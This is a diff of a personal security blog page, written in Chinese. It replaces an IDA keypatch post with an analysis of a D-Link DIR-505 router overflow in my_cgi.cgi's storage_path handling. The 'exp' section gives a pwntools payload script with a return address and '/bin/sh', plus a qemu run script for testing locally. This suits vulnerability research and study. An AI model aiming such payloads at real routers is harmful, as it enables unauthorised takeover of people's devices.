@@ -4,33 +4,29 @@
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
   
-    <title>IDA插件keypatch初体验 | p1Kk&#39;s World!</title>
+    <title>D-Link DIR-505 便携路由器越界漏洞分析 | p1Kk&#39;s World!</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="p1Kk">
     
 
     
-    <meta name="description" content="写于19.6.28  我们用一个简单的栈溢出程序做实验进入IDA发现程序存在getshell函数 找到上方Edit 我们尝试修改call hello为call getShell，使程序运行到这步直接调用getShell函数 这里只举例用汇编修改，使用汇编修改比较方便 修改成功，下面保存文件 替换掉原本的hello文件 我们在linux中执行hello文件，可以发现直接getshell了 修改成功">
-<meta name="keywords" content="AWD,pwn">
+    <meta name="description" content="固件下载：http://files.dlink.com.au/Products/DIR-505/REV_A/Firmware/v1.05b04/  根据披露，漏洞存在于my_cgi.cgi脚本，处理POST参数中storage_path参数的值时，存在边界验证不合理导致程序越界访问。（且这个路由器存在多个漏洞 分析基础步骤不再赘述，找到my_cgi.cgi文件注意这次是大端了，要用qemu-mi">
+<meta name="keywords" content="笔记,iot,栈溢出">
 <meta property="og:type" content="article">
-<meta property="og:title" content="IDA插件keypatch初体验">
-<meta property="og:url" content="p1Kk.github.io/2019/10/03/keypatch/keypatch/index.html">
+<meta property="og:title" content="D-Link DIR-505 便携路由器越界漏洞分析">
+<meta property="og:url" content="p1Kk.github.io/2020/05/13/路由器/Dlink 505便携路由器越界漏洞/index.html">
 <meta property="og:site_name" content="p1Kk&#39;s World!">
-<meta property="og:description" content="写于19.6.28  我们用一个简单的栈溢出程序做实验进入IDA发现程序存在getshell函数 找到上方Edit 我们尝试修改call hello为call getShell，使程序运行到这步直接调用getShell函数 这里只举例用汇编修改，使用汇编修改比较方便 修改成功，下面保存文件 替换掉原本的hello文件 我们在linux中执行hello文件，可以发现直接getshell了 修改成功">
+<meta property="og:description" content="固件下载：http://files.dlink.com.au/Products/DIR-505/REV_A/Firmware/v1.05b04/  根据披露，漏洞存在于my_cgi.cgi脚本，处理POST参数中storage_path参数的值时，存在边界验证不合理导致程序越界访问。（且这个路由器存在多个漏洞 分析基础步骤不再赘述，找到my_cgi.cgi文件注意这次是大端了，要用qemu-mi">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-58ccc3800b9bc313.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-3a176ef627310c71.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-41bfae610214d312.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-05d8761f51f94e4f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-4ad0088109390a54.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-a81b396d64865648.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/17548101-45e44bfcbe7fa0c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2019-10-03T03:00:32.496Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/MSB.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/storage_path.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/getmemset.png">
+<meta property="og:updated_time" content="2020-05-15T03:49:13.307Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="IDA插件keypatch初体验">
-<meta name="twitter:description" content="写于19.6.28  我们用一个简单的栈溢出程序做实验进入IDA发现程序存在getshell函数 找到上方Edit 我们尝试修改call hello为call getShell，使程序运行到这步直接调用getShell函数 这里只举例用汇编修改，使用汇编修改比较方便 修改成功，下面保存文件 替换掉原本的hello文件 我们在linux中执行hello文件，可以发现直接getshell了 修改成功">
-<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/17548101-58ccc3800b9bc313.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta name="twitter:title" content="D-Link DIR-505 便携路由器越界漏洞分析">
+<meta name="twitter:description" content="固件下载：http://files.dlink.com.au/Products/DIR-505/REV_A/Firmware/v1.05b04/  根据披露，漏洞存在于my_cgi.cgi脚本，处理POST参数中storage_path参数的值时，存在边界验证不合理导致程序越界访问。（且这个路由器存在多个漏洞 分析基础步骤不再赘述，找到my_cgi.cgi文件注意这次是大端了，要用qemu-mi">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/MSB.png">
 
     
     <link rel="alternative" href="atom.xml" title="p1Kk&#39;s World!" type="application/atom+xml">
@@ -94,14 +90,14 @@
 		  <header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2019/10/03/keypatch/keypatch/" title="IDA插件keypatch初体验" itemprop="url">IDA插件keypatch初体验</a>
+      <a href="/2020/05/13/路由器/Dlink 505便携路由器越界漏洞/" title="D-Link DIR-505 便携路由器越界漏洞分析" itemprop="url">D-Link DIR-505 便携路由器越界漏洞分析</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="p1Kk" target="_blank" itemprop="author">p1Kk</a>
 		
   <p class="article-time">
-    <time datetime="2019-10-03T02:57:24.003Z" itemprop="datePublished"> Published 2019-10-03</time>
+    <time datetime="2020-05-12T16:00:00.000Z" itemprop="datePublished"> Published 2020-05-13</time>
     
   </p>
 </header>
@@ -110,21 +106,28 @@
 		  <div id="toc" class="toc-article">
 			  <strong class="toc-title">Contents</strong>
 		  
-			  
+			  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#分析"><span class="toc-number">1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">2.</span> <span class="toc-text">exp</span></a></li></ol>
 		  
 		  </div>
 		  
-		  <ul>
-<li>写于19.6.28</li>
-</ul>
-<p>我们用一个简单的栈溢出程序做实验<br>进入IDA发现程序存在getshell函数<br><img src="https://upload-images.jianshu.io/upload_images/17548101-58ccc3800b9bc313.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
-<p>找到上方<code>Edit</code><br><img src="https://upload-images.jianshu.io/upload_images/17548101-3a176ef627310c71.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
-<p>我们尝试修改call hello为call getShell，使程序运行到这步直接调用getShell函数<br><img src="https://upload-images.jianshu.io/upload_images/17548101-41bfae610214d312.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
-<p>这里只举例用汇编修改，使用汇编修改比较方便<br><img src="https://upload-images.jianshu.io/upload_images/17548101-05d8761f51f94e4f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
-<p>修改成功，下面保存文件<br><img src="https://upload-images.jianshu.io/upload_images/17548101-4ad0088109390a54.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
-<p>替换掉原本的hello文件<br><img src="https://upload-images.jianshu.io/upload_images/17548101-a81b396d64865648.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
-<p>我们在linux中执行hello文件，可以发现直接getshell了<br><img src="https://upload-images.jianshu.io/upload_images/17548101-45e44bfcbe7fa0c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
-<p>修改成功！😁</p>
+		  <blockquote>
+<p>固件下载：<a href="http://files.dlink.com.au/Products/DIR-505/REV_A/Firmware/v1.05b04/" target="_blank" rel="noopener">http://files.dlink.com.au/Products/DIR-505/REV_A/Firmware/v1.05b04/</a></p>
+</blockquote>
+<p>根据披露，漏洞存在于<code>my_cgi.cgi</code>脚本，处理POST参数中<code>storage_path</code>参数的值时，存在边界验证不合理导致程序越界访问。（且这个路由器存在多个漏洞</p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>基础步骤不再赘述，找到<code>my_cgi.cgi</code>文件<br><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/MSB.png" alt><br>注意这次是大端了，要用<code>qemu-mips-static</code></p>
+<p>不太喜欢直接上脚本，先分析吧<br>查找<code>storage_path</code>，查看引用<br><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/storage_path.png" alt><br>看着<code>get_input_entries</code>就像是输入函数，所以进去分析一波，发现</p>
+<p>所以要继续分析这个函数的参数，查找引用，来看看参数到底指的是什么。。。<br><a href="https://tearorca.github.io/D-Link-DIR-505%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">这位师傅的分析</a>很细致，汇编真杀我…<br>所以，那个for循环就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for (int i = CONTENT_LENGTH; i &gt; 0; i--)</span><br></pre></td></tr></table></figure>
+
+<p>问题就在于，并没有对传入的CONTENT_LENGTH长度进行检验，会导致溢出<br><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/getmemset.png" alt></p>
+<p>缓冲区大小为0x7490A<br>发现文件中有可用的system函数，查找一下引用，找到合适的再构造，和以前的都一样了</p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>目前是这样的，本地测试不太方便，买了个真机，等到了回来试试再改😶</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">context.endian=&quot;big&quot;</span><br><span class="line">context.arch=&quot;mips&quot;</span><br><span class="line"></span><br><span class="line">payload  = &quot;storage_path=&quot;</span><br><span class="line">payload += &quot;a&quot; * 0x7490a</span><br><span class="line">payload += &quot;b&quot; * 0x16</span><br><span class="line">payload += p32(0x00404EA0)</span><br><span class="line">payload += &quot;c&quot; * 0x8C</span><br><span class="line">payload += &quot;/bin/sh\x00&quot;</span><br><span class="line"></span><br><span class="line">with open(&quot;payload&quot;,&apos;wb&apos;) as f:</span><br><span class="line">    f.write(payload)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>run_cgi.sh</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">INPUT=&quot;$(&lt;payload)&quot;</span><br><span class="line">LEN=$(echo -n &quot;$INPUT&quot; | wc -c)</span><br><span class="line">PORT=&quot;1234&quot;</span><br><span class="line"></span><br><span class="line">if [ &quot;$LEN&quot; == &quot;0&quot; ] || [ &quot;$INPUT&quot; == &quot;-h&quot; ] || [ &quot;$UID&quot; != &quot;0&quot; ]</span><br><span class="line">then</span><br><span class="line">    echo -e &quot;\nUsage: sudo $0 \n&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">cp $(which qemu-mips-static) ./qemu</span><br><span class="line"></span><br><span class="line">echo &quot;$INPUT&quot; | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E SCRIPT_NAM=&quot;common&quot; -E REQUEST_METHOD=&quot;POST&quot; -E REQUEST_URI=&quot;/my_cgi.cgi&quot; -E REMOTE_ADDR=&quot;192.168.1.1&quot; -g $PORT ./usr/bin/my_cgi.cgi</span><br><span class="line">echo &apos;run ok&apos;</span><br><span class="line">rm -f ./qemu</span><br></pre></td></tr></table></figure>
+
   
 	  </div>
 		  <footer class="article-footer clearfix">
@@ -138,7 +141,7 @@
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/AWD/">AWD</a><a href="/tags/pwn/">pwn</a>
+  <span></span> <a href="/tags/笔记/">笔记</a><a href="/tags/iot/">iot</a><a href="/tags/栈溢出/">栈溢出</a>
   </div>
 
 </div>
@@ -152,17 +155,10 @@
 	  
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2019/10/03/Jarvis oj/wp/" title="Jarvis OJ pwn wp(未完...看情况继续写)">
-  <span>
-  Jarvis OJ pwn wp(未完...看情况继续写)</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2019/10/03/redpwnctf ropchain/wp/"  title="2019 RedpwnCTF Bronze Ropchain wp">
- <span>2019 RedpwnCTF Bronze Ropchain wp
+<a href="/2020/05/03/路由器/D-Link DIR-645栈溢出漏洞/"  title="D-Link DIR-645(/865/845)路由器栈溢出漏洞分析">
+ <span>D-Link DIR-645(/865/845)路由器栈溢出漏洞分析
 </span>
 </a>
 </div>
